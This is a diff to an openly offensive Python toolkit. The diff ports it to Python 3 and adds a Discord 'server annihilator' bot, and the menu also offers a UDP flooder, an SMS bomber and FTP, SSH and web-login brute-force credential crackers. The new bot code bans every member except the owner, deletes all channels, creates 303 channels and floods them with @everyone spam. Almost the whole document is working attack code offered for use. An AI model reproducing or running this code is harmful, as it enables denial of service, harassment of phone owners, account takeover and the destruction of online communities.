@@ -5,6 +5,7 @@ import os
 import json
 import colorama
 from colorama import init, Fore
+from colorama import init, Fore, Style
 import time
 init(autoreset=True)
 import sys
@@ -12,8 +13,10 @@ import socket
 import threading
 import logging
 import random
-import urllib2, cookielib
-import random
+import urllib.request
+import urllib.error
+import urllib.parse
+import http.cookiejar
 from datetime import datetime
 now = datetime.now()
 hour = now.hour
@@ -21,6 +24,12 @@ minute = now.minute
 day = now.day
 month = now.month
 year = now.year
+import asyncio
+import discord
+from discord.ext import commands
+import time
+import threading
+from discord.ext import tasks
 
 logo = """
 • ▌ ▄ ·.  ▄▄▄· ·▄▄▄▄   ▐ ▄ ▄▄▄ ..▄▄ · .▄▄ · 
@@ -109,16 +118,17 @@ while True:
     print(Fore.CYAN + "[2] MadSpam SMS Bomber")
     print(Fore.GREEN + "[3] SCANNIT IP Lookup")
     print(Fore.RED + "[4] RedRipper BRUTE-FORCE Tool-Kit")
+    print(Fore.RED + Style.BRIGHT + "[5] R3dM1st Discord Server Annihilator")
     print("[0] Exit")
     print(Fore.RED + barrier)
     print(" ")
-    x = raw_input(Fore.GREEN + "Option > ").strip()
+    x = input(Fore.GREEN + "Option > ").strip()
 
     if x == "1":
         os.system("clear")
         print(Fore.MAGENTA + FlameGRAVE)
-        server_ip = raw_input(Fore.RED + "Enter Target IP: ").strip()
-        port = int(raw_input(Fore.RED + "Enter Target IP Port [1-65535]: ").strip())
+        server_ip = input(Fore.RED + "Enter Target IP: ").strip()
+        port = int(input(Fore.RED + "Enter Target IP Port [1-65535]: ").strip())
 
 
         os.system("clear")
@@ -152,7 +162,7 @@ while True:
                 sys.stdout.write(Fore.RED + "Fireball %s shot to %s through port:%s\n" % (sent, server_ip, port))
                 sys.stdout.flush()
         except KeyboardInterrupt:
-            raw_input("\nAttack suspended. Press Enter to return to the menu...")
+            input("\nAttack suspended. Press Enter to return to the menu...")
 
     if x == "2":
         os.system("clear")
@@ -163,23 +173,23 @@ while True:
             #data={"phone":num}
             result_url = url+num
 
-            req = urllib2.Request(result_url, headers=hdr)
+            req = urllib.request.Request(result_url, headers=hdr)
             for i in range(counter):
                 try:
-                    page = urllib2.urlopen(req)
+                    page = urllib.request.urlopen(req)
                     print(Fore.MAGENTA + " Message sent! (Attempt {})".format(i+1))
-                except urllib2.HTTPError as e:
+                except urllib.error.HTTPError as e:
                     print(" HTTP Error {}: {}".format(e.code, e.reason))
-                except urllib2.URLError as e:
+                except urllib.error.URLError as e:
                     print("URL Error: {}".format(e.reason))
                 time.sleep(sleep)
 
         try:
             print(Fore.CYAN + MadSpam)
             print(Fore.RED + barrier)
-            number = raw_input(Fore.RED + "Enter Full Target Number [With CC]: ")
-            count = raw_input(Fore.RED + "Enter number of SMS Messages: ")
-            throttle = raw_input(Fore.RED + "Enter time interval: ")
+            number = input(Fore.RED + "Enter Full Target Number [With CC]: ")
+            count = input(Fore.RED + "Enter number of SMS Messages: ")
+            throttle = input(Fore.RED + "Enter time interval: ")
             os.system("clear")
             print(Fore.CYAN + MadSpam)
             print(Fore.RED + barrier)
@@ -190,9 +200,9 @@ while True:
             time.sleep(1)
             print(" ")
             send(number, int(count), int(throttle))
-            raw_input(" Press Enter to return to menu...")
+            input(" Press Enter to return to menu...")
         except KeyboardInterrupt:
-           raw_input("\nSpamming suspended. Press Enter to return to the menu...")
+           input("\nSpamming suspended. Press Enter to return to the menu...")
         finally:
             pass
 
@@ -200,7 +210,7 @@ while True:
         os.system("clear")
         print(Fore.GREEN + SCANNIT)
         print(Fore.RED + barrier)
-        ip = raw_input(Fore.RED + "Enter Target IP address: ")
+        ip = input(Fore.RED + "Enter Target IP address: ")
         time.sleep(1)
         os.system("clear")
         r = requests.get("http://ip-api.com/json/" + ip)
@@ -233,7 +243,7 @@ while True:
         print (Fore.CYAN + " Internet company [ISP]: " + data["isp"])
         time.sleep(3)
         print(" ")
-        raw_input(" Press Enter to return to menu...")
+        input(" Press Enter to return to menu...")
 
     if x == "4":
         os.system("clear")
@@ -250,7 +260,7 @@ while True:
             value = value.strip()
             if not value:
                 print("INVALID WORDLIST.")
-                raw_input("Press Enter to return...")
+                input("Press Enter to return...")
                 return []
 
             if os.path.isfile(value):
@@ -327,19 +337,19 @@ while True:
             print(Fore.MAGENTA + "           |WEB LOGIN CREDENTIAL RIPPER|\n")
 
             try:
-                URL = raw_input(Fore.CYAN + "Enter Target URL: ").strip()
-                FIELD1 = raw_input(Fore.CYAN + "Enter Username Field (leave empty to skip): ").strip()
-                VALID = raw_input(Fore.MAGENTA + "Enter Valid Username (leave empty to skip): ").strip()
-                FIELD2 = raw_input(Fore.CYAN + "Enter Second Field (Password OR Username field): ").strip()
-                WORDLIST = raw_input(Fore.CYAN + "Enter Username or Password Wordlist (.txt): ").strip()
-                FAIL = raw_input(Fore.CYAN + "Enter Fail-String (invalid indicator): ").strip()
-                OUTPUT = raw_input(Fore.CYAN + "Enter Output File (success.txt): ").strip()
+                URL = input(Fore.CYAN + "Enter Target URL: ").strip()
+                FIELD1 = input(Fore.CYAN + "Enter Username Field (leave empty to skip): ").strip()
+                VALID = input(Fore.MAGENTA + "Enter Valid Username (leave empty to skip): ").strip()
+                FIELD2 = input(Fore.CYAN + "Enter Second Field (Password OR Username field): ").strip()
+                WORDLIST = input(Fore.CYAN + "Enter Username or Password Wordlist (.txt): ").strip()
+                FAIL = input(Fore.CYAN + "Enter Fail-String (invalid indicator): ").strip()
+                OUTPUT = input(Fore.CYAN + "Enter Output File (success.txt): ").strip()
 
                 try:
                     words = open(WORDLIST, "r").read().splitlines()
                 except Exception as e:
                     print(Fore.RED + "ERROR reading wordlist: {}".format(e))
-                    raw_input("Press Enter...")
+                    input("Press Enter...")
                     return
 
                 print(Fore.MAGENTA + "\nRIPPING CREDENTIALS...\n")
@@ -350,13 +360,13 @@ while True:
                 if mode == "password":
                     if FIELD1 == "" or FIELD2 == "":
                         print(Fore.RED + "ERROR: FIELD1 and FIELD2 are required for password bruteforce.")
-                        raw_input("Press Enter...")
+                        input("Press Enter...")
                         return
 
                 else:
                     if FIELD2 == "":
                         print(Fore.RED + "ERROR: FIELD2 (username field) is required for username bruteforce.")
-                        raw_input("Press Enter...")
+                        input("Press Enter...")
                         return
 
                 for user in words:
@@ -374,7 +384,7 @@ while True:
                         continue
                     except requests.exceptions.ConnectionError:
                         print(Fore.RED + "[ERROR] Connection lost.")
-                        raw_input("Press Enter...")
+                        input("Press Enter...")
                         break
                     except Exception as e:
                         print(Fore.RED + "[ERROR] Unexpected:", e)
@@ -388,18 +398,18 @@ while True:
                         except:
                             print(Fore.RED + "[ERROR] Cannot write output file.")
 
-                        raw_input("\nPress Enter...")
+                        input("\nPress Enter...")
                         break
 
                     else:
                         print(Fore.RED + "[INVALID] " + user)
 
                 print(Fore.RED + "\nBruteforce complete. No valid match found.")
-                raw_input("Press Enter...")
+                input("Press Enter...")
 
             except KeyboardInterrupt:
                 print(Fore.YELLOW + "\nStopped by user.")
-                raw_input("Press Enter...")
+                input("Press Enter...")
                 return
 
         def perform_attack(target_type):
@@ -408,10 +418,10 @@ while True:
             print(Fore.RED + barrier)
             print(Fore.MAGENTA + "       |{} CREDENTIAL RIPPER|\n".format(target_type))
 
-            target_ip = raw_input(Fore.RED + "Enter Target IP: ")
-            target_port = raw_input(Fore.RED + "Enter {} Port: ".format(target_type))
-            username_input = raw_input(Fore.CYAN + "Enter Username Wordlist: ")
-            password_input = raw_input(Fore.CYAN + "Enter Password Wordlist: ")
+            target_ip = input(Fore.RED + "Enter Target IP: ")
+            target_port = input(Fore.RED + "Enter {} Port: ".format(target_type))
+            username_input = input(Fore.CYAN + "Enter Username Wordlist: ")
+            password_input = input(Fore.CYAN + "Enter Password Wordlist: ")
 
             usernames = load_list(username_input)
             passwords = load_list(password_input)
@@ -440,15 +450,15 @@ while True:
                         print(Fore.GREEN + "SUCCESS: {} {} {}".format(target_ip, user, passwd))
                         with open(success_file, "a") as sf:
                             sf.write("IP: {}, User: {}, Pass: {}\n".format(target_ip, user, passwd))
-                        ex = raw_input("Exit or Continue? [E/C]: ").lower()
+                        ex = input("Exit or Continue? [E/C]: ").lower()
                         if ex == "e":
                             return
                     else:
                         print(Fore.RED + "FAILED: {} {}".format(user, passwd))
 
-            raw_input("Press Enter...")
+            input("Press Enter...")
 
-        choice = raw_input(Fore.GREEN + "Option > ")
+        choice = input(Fore.GREEN + "Option > ")
 
         if choice == "1":
             perform_attack("FTP")
@@ -461,15 +471,272 @@ while True:
         elif choice == "5":
             perform_web_attack()
         elif choice == "6":
-            raw_input("Press Enter to return...")
+            input("Press Enter to return...")
         else:
-            raw_input("Invalid choice. Press Enter...")
+            input("Invalid choice. Press Enter...")
+
+    if x == "5":
+        os.system("clear")
+        R3DM1ST = """
+        ▄▄▄  ▄▄▄ .·▄▄▄▄        
+        ▀▄ █·▀▄.▀·██▪ ██       
+        ▐▀▀▄ ▐▀▀▪▄▐█· ▐█▌      
+        ▐█•█▌▐█▄▄▌██. ██       
+       .▀  ▀ ▀▀▀ ▀▀▀▀▀•       
+        • ▌ ▄ ·. ▪  .▄▄ · ▄▄▄▄▄
+        ·██ ▐███▪██ ▐█ ▀. •██  
+        ▐█ ▌▐▌▐█·▐█·▄▀▀▀█▄ ▐█.▪
+        ██ ██▌▐█▌▐█▌▐█▄▪▐█ ▐█▌·
+        ▀▀  █▪▀▀▀▀▀▀ ▀▀▀▀  ▀▀▀ 
+        """
+
+        print(Fore.MAGENTA + R3DM1ST)
+        print(Fore.RED + "=" * 49)
+        print(" ")
+
+        BOT_TOKEN = input(Fore.GREEN + " + INSERT BOT TOKEN: ")
+
+        if not BOT_TOKEN.strip():
+            continue
+
+        PREFIX = "!"
+
+        # Nuke Configuration
+        CHANNEL_NAME = "FLARED"
+        MESSAGE = "@everyone @here 👎︎⚐︎☠︎❄︎ 💧︎✌︎✡︎ ✋︎ 👎︎✋︎👎︎☠︎❄︎ 🕈︎✌︎☼︎☠︎ ✡︎⚐︎🕆︎ - ✋︎ 🕈︎⚐︎☠︎🕯︎❄︎ ☹︎☜︎❄︎ ✡︎⚐︎🕆︎ ☝︎☜︎❄︎ ✌︎🕈︎✌︎✡︎ ❄︎☟︎✋︎💧︎ ❄︎✋︎💣︎☜︎/ D̶̢̧̰͇͝Ơ̶̰̝̬͒N̴̖̹̳̂̏͝'̵͔̣̪͒̄̏T̵̥͒ ̸͈̗̽Ş̷̜̯̼̈̓A̶̲̜̳͂Ŷ̸̮́̏ ̴͎̠̙̓̅̓̍I̵̪̠͍̹̚ ̷̣̺̙̈ͅD̴͈̮̐I̷̺̜̒D̷͖̋̂̀N̴̙̦͙̈́̆͆'̵̩͖͈̓T̵̫̟̺̉ ̶͓͇̒͗̔W̷̥͋̕̕À̴̧̗̌R̴͔̎̏͌N̷̓̿ͅ ̵̠̤̾Y̶̡͖̙͂̚̚͠Õ̵̠͔̭͖̃̕Ù̶̍́ͅ,̵̤̪̳͌̿ ̸̥̫̬̱̒͋̈́̔-̵̡̓ ̷̝̻͇̓̉̅W̴̛̗̃͐̾͜O̷͉̞͝N̸͓̱̰͑̊'̷̤̖̆T̷̖̬̆̈̂͑ ̶̮̖̎͑̑̄L̷̺̭̭͖̒͐E̴͉͕̽͜T̴̢͍̞̈́͛̌̓͜ ̴̲̭̠͒̂͜Ỷ̸̫̽O̵̜̎͐̏̕Ữ̸̱̗͓͠ ̵̢͈̰͘͜͠G̶̎͊͗͜E̶̺̿T̴͓͚̣̝̐ ̶̨͚̓̈́̃A̴̛̩̼͔̾̎W̷̺̳̽͛A̴̛̫̰̥̤͆́̍Y̵̻̞͊͝ ̸̧͓̏͜T̵̖̀̆̀H̸̬͂I̵͔̱͈͇͛͗̍Ŝ̶̡̱̗̀̏͝ ̷̺͝T̸͇͓͖̉̀̏͘͜I̶͖̠͂̔͌͂M̸̢̔Ẹ̴͙͈̉̈́̓"
+        AMOUNT_OF_CHANNELS = 303
+        AMOUNT_OF_MESSAGES = 1000
+        SERVER_NAME = "PURGED"
+
+        # Random channel name variations (optional - set to None to use CHANNEL_NAME)
+        RANDOM_CHANNEL_NAMES = [
+            "B̷̧̡̢̡̢̡̧̛͓̮̙̣̩̮̗͎̠̩͔̘̰̖̲̮̼̩̹̩̠͖̬̺͖̲͕͓̪̞̼̻̍̋̒́͛͑̏̒̈͆͗͘ͅͅŲ̶̧̛̲̺̭͉̳̯̭͈̫͖͕̳̰̩̼͙̪̥̦̟̙̣̻̭͔̬̟̬͖̞͉̣͔͚̺͙̻͈̋́̓̊̿̆͊̄͊͒̏̍͒͛̓͒͑͛̇͐͛̈̈́̑̓̂̎̿̾̃̉̽̑͌̈́̌̔͘̕̕͝͝R̷̢̧̨̧̨̯͎̖̰͇̻̼͍̗̞̭̱̝̰͇͙̞̩̗͖̻̯͓̹̙̳̙̮̺̝̪̻̝͔̭̝̝̰̳͈̙͕̎̇̾̍̃̓́̂̀̅̈́̇͆͋͛̊̊̋̏̽͋̍͒̄̔̉̀͑̔̀̕̕N̸̨̡̛͉̩̰̦̘̼͓̻͚͉͔̭̣̩͔̖̩̙͈͉̜͋͑̌̿̈́̌̆̄̀̎͑̿́̍͊̈́̓͝E̷̮̙͎̖͙̦̠̺̳̰̪͚͙̹͖̰͍̺̲̱͙͖̙̯̪͚̫̤̫̎͠ͅD̶̢̛̛͔̖̭͙͈̤̳̣͉͍̘̬̘̙̪͉̱̘̣̫͔͇͖͕͕̲̣̤̦̜͚̼̠̠͓̏̈́̓͆͂̊͆̏̏̃͛̊͒͛̒͂̋̔̓͗̐́̀͊͘͘̕͜͜͜͝ͅ",
+            "D̵͍̻̖̳̆͑͊̾E̵̫̍͌͊̕͠S̴̠̪͈̆̊̽͜Ţ̴̟̄̈́̉̑̓̕R̸̻͎̄O̵͚̫̲͍̩̪̊́Ÿ̸͙̹́̎̐̃E̶̤̗̫͉̰̒͛͜D̸̤̥̒͂̊̿͂̊",
+            "E̸̛̗̋̇̔̔̈͠͠Ļ̴͉̬̠͚̉̐̅̃͐͠Ì̶̧̧̛͔̖̝̘̝͝Ṃ̶̨̛̤̓̓̈́̔I̶̖̮̋͒N̷̗͇̰̗̼̖̔̎̄Ȃ̷͍̥Ţ̷̜͚̼̫͊͆̎̔͜͝͝E̷͖̻̻̗̥̪͝D̵̞̦̠̈́",
+            "👌︎🕆︎☼︎☠︎☜︎👎︎",
+            "👎︎☜︎💧︎❄︎☼︎⚐︎✡︎☜︎👎︎",
+            "☞︎☹︎✌︎☼︎☜︎👎︎"
+        ]
+
+        USE_RANDOM_NAMES = True  # Set to False to use CHANNEL_NAME only
+
+        screen = "menu"
+        ui_started = False
+
+        os.system("clear")
+
+        def get_channel_name():
+            """Get channel name (random or fixed)"""
+            if USE_RANDOM_NAMES and RANDOM_CHANNEL_NAMES:
+                return random.choice(RANDOM_CHANNEL_NAMES)
+            return CHANNEL_NAME
+
+        intents = discord.Intents.default()
+        intents.guilds = True
+        intents.members = True
+        intents.message_content = True
+
+        bot = commands.Bot(command_prefix=PREFIX, intents=intents)
+
+        @tasks.loop(count=1)
+        async def rename_server():
+            await bot.wait_until_ready()
+
+            for guild in bot.guilds:
+                try:
+                    await guild.edit(name=SERVER_NAME)
+                except Exception as e:
+                    print(f"Failed: {e}")
+
+        async def send_messages_fast(channels, message, total):
+            """Send messages with rate limiting using semaphore"""
+            if not channels:
+                return
+    
+
+            semaphore = asyncio.Semaphore(50)
+    
+            async def send_with_limit(channel, msg):
+                async with semaphore:
+                    try:
+                        await channel.send(msg)
+                    except Exception:
+                        pass
+    
+            tasks = []
+            for i in range(total):
+                channel = channels[i % len(channels)]
+                tasks.append(send_with_limit(channel, message))
+    
+            await asyncio.gather(*tasks, return_exceptions=True)
+
+        async def ban_members(guild, reason=None):
+            banned_count = 0
+
+            for member in guild.members:
+                if member == guild.owner:
+                    continue
+
+                try:
+                    await member.ban(reason=reason)
+                except discord.errors.Forbidden:
+                    continue
+
+                except discord.errors.HTTPException as e:
+                    await asyncio.sleep(2)
+                    continue
+
+                banned_count += 1
+            print(Fore.MAGENTA + f"PURGED {banned_count} USERS IN TARGET SERVER")
+
+        async def RAMPAGE_server(guild: discord.Guild):
+            """Main RAMPAGE logic -renames server, deletes all channels, bans members, creates new channels, and spams messages"""
+            print(Fore.MAGENTA + "RED MIST APPROACHING THE TARGET")
+            print(" ")
+            start_time = time.perf_counter()
+
+            rename_server.start()
+
+            print(Fore.RED + "!––––––—–PURGING CHANNELS AT THE MOMENT–––––––—–!")
+            print(" ")
+
+            print(Fore.RED + "!––––––—–PURGING SERVER MEMBERS–––––––—–!")
+            reason = "D̵̛͉O̶͉̊̕N̷͈̂Ţ̵̞̓̑ ̶̙́S̵̱̘̅̀Ą̸̀͑Y̵͍̣̿ ̸͖̐͌I̵͍̭̋ ̵̺͔̚Ḍ̷̒I̵̪͐͝D̵̛̺̿ͅŃ̶̗̼̕'̶̙͇̒T̸̫̦͂̕ ̵͎̒̑W̸͚̱̕A̶͈͚̍͛R̴̹̖̈N̵͉͋ ̷̱̘̂́Ý̴͖̥O̸̘̙̓Ů̴͇̹"
+            banned_count = await ban_members(guild, reason)
+            print(" ")
+
+            await asyncio.gather(
+                *(channel.delete() for channel in guild.channels),
+                return_exceptions=True
+            )
+
+            print(Fore.RED + "!–––––––––——–––ADDING 303 CHANNELS–––––––––––––——!")
+            print(" ")
+            async def create_raid_channel():
+                return await guild.create_text_channel(get_channel_name())
+    
+            channels = await asyncio.gather(
+                *(create_raid_channel() for _ in range(AMOUNT_OF_CHANNELS)),
+                return_exceptions=True
+            )
+
+            text_channels = [c for c in channels if isinstance(c, discord.TextChannel)]
+            if text_channels:
+                print(Fore.MAGENTA + "!!!!!––———–––SPAMMING TARGET SERVER–––—––—–––!!!!!")
+                await send_messages_fast(text_channels, MESSAGE, AMOUNT_OF_MESSAGES)
+
+            elapsed = time.perf_counter() - start_time
+            print(Fore.GREEN + f"EXECUTION SUCCEEDED WITHIN {elapsed:.2f}s")
+
+        def render(bot):
+            os.system("clear")
+        
+            if screen == "menu":
+                print(Fore.MAGENTA + R3DM1ST)
+                print(Fore.BLUE + "Made by TWC (The Wrecking Crew)")
+                print(Fore.RED + "THE MADNESS HAS STARTED – F̸͈͚̲̌̀̀̽Ĩ̸͎͙̳N̷̛͍̯͔͛̎͛I̴͇͑S̷̟̼͓̭̊͆͘H̷̩̱̙́̽̕͠ ̶͇̗͉̔̿Ṫ̴̝̥̮̘̌Ḩ̷͉̅̍̆͜E̶͈̼̝͒̐́M̵̳̻̏̓")
+                print(Fore.MAGENTA + "—" * 50)
+                print(Fore.GREEN + "- STATUS: ONLINE – OPERATIONS READY TO EXECUTE")
+                print(Fore.MAGENTA + "—" * 50)
+                print(Fore.GREEN + "- PREFIX: !")
+                print(Fore.MAGENTA + "—" * 50)
+                print(Fore.RED + "- LAUNCH: !RAMPAGE")
+                print(Fore.MAGENTA + "—" * 50)
+                print(Fore.BLUE + "- Welcome to R3dM1st console, the purpose of this console is to keep track and analyze the process of operations done using R3dM1st.")
+                print(Fore.MAGENTA + "—" * 50)
+                print(Fore.WHITE + " Press ENTER to view target servers list")
+                print(Fore.CYAN + "• Awaiting launch by operator(s).")
+                print(" ")
+
+            if screen == "targets":
+                print(Fore.MAGENTA + "—" * 50)
+                print(Fore.RED + "                  !LIST OF TARGETS!")
+                print(Fore.MAGENTA + "—" * 50)
+                for g in bot.guilds:
+                    print(f"{g.name} ({g.id})")
+                print(Fore.MAGENTA + "—" * 50)
+                print(" ")
+                print(Fore.WHITE + "Press ENTER to return...")
+    
+        def input_loop(bot, loop):
+            global screen
+            while True:
+                input()
+                screen = "targets" if screen == "menu" else "menu"
+                loop.call_soon_threadsafe(render, bot)
+
+        @bot.event
+        async def on_ready():
+            global ui_started
+            if ui_started:
+                return
+            os.system("clear")
+            print(Fore.MAGENTA + R3DM1ST)
+            print(Fore.BLUE + "Made by TWC (The Wrecking Crew)")
+            print(Fore.RED + "THE MADNESS HAS STARTED – F̸͈͚̲̌̀̀̽Ĩ̸͎͙̳N̷̛͍̯͔͛̎͛I̴͇͑S̷̟̼͓̭̊͆͘H̷̩̱̙́̽̕͠ ̶͇̗͉̔̿Ṫ̴̝̥̮̘̌Ḩ̷͉̅̍̆͜E̶͈̼̝͒̐́M̵̳̻̏̓")
+            await asyncio.sleep(2)
+            print(Fore.MAGENTA + "—" * 50)
+            print(Fore.GREEN + "- STATUS: ONLINE – OPERATIONS READY TO EXECUTE")
+            print(Fore.MAGENTA + "—" * 50)
+            await asyncio.sleep(1)
+            print(Fore.GREEN + "- PREFIX: !")
+            print(Fore.MAGENTA + "—" * 50)
+            await asyncio.sleep(0.5)
+            print(Fore.RED + "- LAUNCH: !RAMPAGE")
+            print(Fore.MAGENTA + "—" * 50)
+            await asyncio.sleep(1)
+            print(Fore.BLUE + "- Welcome to R3dM1st console, the purpose of this console is to keep track and analyze the process of operations done using R3dM1st.")
+            print(Fore.MAGENTA + "—" * 50)
+            await asyncio.sleep(0.25)
+            print(Fore.WHITE + " Press ENTER to view target servers list")
+            print(Fore.CYAN + "• Awaiting launch by operator(s).")
+            print(" ")
+            render(bot)
+            if not ui_started:
+                ui_started = True
+                loop = asyncio.get_running_loop()
+
+                threading.Thread(
+                    target=input_loop,
+                    args=(bot, loop),
+                    daemon=True
+                ).start()
+
+        @bot.command(name="RAMPAGE")
+        async def RAMPAGE(ctx):
+            """RAMPAGE the current server"""
+            if not ctx.author.guild_permissions.administrator:
+                await ctx.send(" ☹ - OPERATION UNSUCCESSFUL; ADMIN PRIVELEGES REQUIRED")
+                return
+
+            await ctx.send(" THE RED MIST HAS ENGULFED - D̵̡̗͐̓O̶̼̜͗̒Ṅ̸͔'̴͉̓̓T̴̰̩͊͠ ̸͇̖͊̍H̵̩̓́Ǫ̵̻̀L̶̪͒̒D̵͔̞̀ ̶̱̄̓B̷̘͐A̸̲̒̿C̷̰̀Ḱ̵̯͚̉ =)")
+    
+            await RAMPAGE_server(ctx.guild)
+
+        @bot.command(name="config")
+        async def config(ctx):
+            """Show current configuration"""
+            config_msg = f"""
+        **Current Configuration:**
+        Channel Name: `{CHANNEL_NAME}`
+        Random Names: `{'Enabled' if USE_RANDOM_NAMES else 'Disabled'}`
+        Message: `{MESSAGE[:50]}...`
+        Channels: `{AMOUNT_OF_CHANNELS}`
+        Messages: `{AMOUNT_OF_MESSAGES}`
+        """
+            await ctx.send(config_msg)
+    
+        if __name__ == "__main__":
+            print(Fore.RED + "=" * 50)
+            print(Fore.MAGENTA + "                                                                 !START-UP DIAGNOSTICS!                                                ")
+            print(Fore.RED + "=" * 50)
+            bot.run(BOT_TOKEN)
 
     if x == "0":
         print("Exiting...")
         break
 
-    if x not in ["0", "1", "2", "3", "4"]:
+    if x not in ["0", "1", "2", "3", "4" "5"]:
         print("Invalid option.")
-        raw_input(" Press Enter to return to menu...")
+        input(" Press Enter to return to menu...")
      
